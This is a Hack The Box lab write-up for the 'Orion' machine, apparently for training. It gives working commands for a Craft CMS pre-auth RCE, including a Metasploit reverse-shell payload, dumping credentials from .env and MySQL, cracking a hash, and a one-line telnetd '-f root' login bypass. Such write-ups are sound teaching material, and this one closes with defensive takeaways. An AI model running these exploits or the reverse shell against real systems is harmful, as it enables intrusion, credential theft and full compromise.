# Hack The Box — Orion

> **Difficulty:** Easy · **OS:** Linux · **Status:** Retired
> Flags are intentionally **redacted** in accordance with the Hack The Box content policy.

Orion chains an **unauthenticated RCE in Craft CMS 5.6.16** (CVE-2025-32432) into
**database credentials from `.env`**, cracks an admin **bcrypt hash** that is reused
for SSH, and escalates to root through an **authentication bypass in a legacy
`telnetd`** (CVE-2026-24061).

```
recon ──► Craft CMS RCE (CVE-2025-32432, www-data)
      └─► .env DB creds ──► crack admin bcrypt ──► SSH as adam (user)
                                              └─► telnetd -f auth bypass ──► root
```

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 2000 10.129.X.X
echo "10.129.X.X orion.htb" | sudo tee -a /etc/hosts
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | nginx 1.18.0 — "Orion Telecom" |

The site is **Craft CMS** (`X-Powered-By: Craft CMS`, `/admin/login`), version
**5.6.16** — vulnerable to CVE-2025-32432.

---

## 2. Foothold — Craft CMS Pre-Auth RCE (CVE-2025-32432)

`craft\controllers\AssetsController::actionGenerateTransform` is registered
`allowAnonymous`, so the asset-transform endpoint is reachable unauthenticated and
deserialises attacker-controlled objects, leading to RCE via a Yii2 gadget chain.

Two reliable options:

**a) Standalone PoC** (nginx access-log poisoning + PhpManager gadget):

```bash
git clone https://github.com/cd-ratel/CVE-2025-32432.git && cd CVE-2025-32432
python3 exploit.py -u http://orion.htb -c 'id'
```

> ⚠️ On a shared lab box the nginx `access.log` may already be polluted by another
> player's `<?php … exit; ?>` block, which runs first and breaks this technique.
> If so, reset the instance — or use option (b), which does not touch the log.

**b) Metasploit** (PHP session poisoning — log-independent, preferred on a dirty box):

```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS 10.129.X.X
set VHOST orion.htb
set target 0
set payload php/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit
```

The module leaks `session.save_path` (`/var/lib/php/sessions`), injects the payload
into a PHP session file, and triggers the gadget → **meterpreter as `www-data`**.

---

## 3. Credential Harvesting

```bash
cat /var/www/html/craft/.env
```

```
CRAFT_SECURITY_KEY=<redacted>
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<redacted>
```

Pull the admin hash from MySQL:

```bash
mysql -u root -p'<redacted>' -N -e "SELECT username,email,password FROM orion.users;"
# admin  adam@orion.htb  $2y$13$e9zuohgFZzGtbQalcn9Mz.5...  (bcrypt, cost 13)
```

`/etc/passwd` shows a matching local user `adam` (UID 1000, `/bin/bash`).

---

## 4. User — Crack the Hash + Password Reuse

```bash
john --format=bcrypt --wordlist=rockyou.txt hash.txt
# adam's password: <redacted>  (found in rockyou)
```

The password is reused for the system account:

```bash
ssh adam@orion.htb          # user flag in ~/user.txt
```

---

## 5. Root — telnetd Authentication Bypass (CVE-2026-24061)

A legacy `inetutils telnetd` listens on `127.0.0.1:23` (via `inetutils-inetd`).
Telnet's `-a` option forwards the `USER` environment variable to `login`; a value
of `-f <user>` is interpreted by `login` as *"assume this user is already
authenticated"*, bypassing the password check entirely.

```bash
# on adam's shell
USER="-f root" telnet -a 127.0.0.1
# lands directly on:
# root@orion:~# id  -> uid=0(root)
cat /root/root.txt
```

Non-interactive one-liner:

```bash
(sleep 3; echo id; echo 'cat /root/root.txt') | USER="-f root" telnet -a 127.0.0.1
```

---

## Key Takeaways

- **Patch internet-facing CMS promptly** — CVE-2025-32432 is unauthenticated,
  pre-auth RCE that was exploited in the wild within days of disclosure.
- **Secrets in `.env` + an all-powerful `root` DB account** turn one RCE into full
  credential disclosure. Scope DB users; keep app secrets out of readable files.
- **Password reuse** between an app admin and a system account bridges web → shell.
- **Legacy services (`telnetd`) are dangerous** — the `-f` login trust option makes
  a local-only daemon a direct root path. Decommission telnet; use SSH only.
